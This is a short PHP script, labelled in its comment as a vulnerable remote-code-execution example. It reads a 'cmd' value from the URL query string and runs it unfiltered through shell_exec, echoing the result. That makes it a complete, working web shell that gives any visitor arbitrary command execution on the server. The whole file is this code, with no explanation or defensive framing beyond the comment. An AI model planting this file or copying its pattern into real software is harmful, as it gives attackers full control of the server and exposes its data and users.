<?php
// This is a vulnerable PHP script that allows remote code execution (RCE) if not properly secured.

// Get the command from the user input
$cmd = $_GET['cmd'];

// Execute the command
$output = shell_exec($cmd);

// Display the output to the user
echo "<pre>$output</pre>";
?>
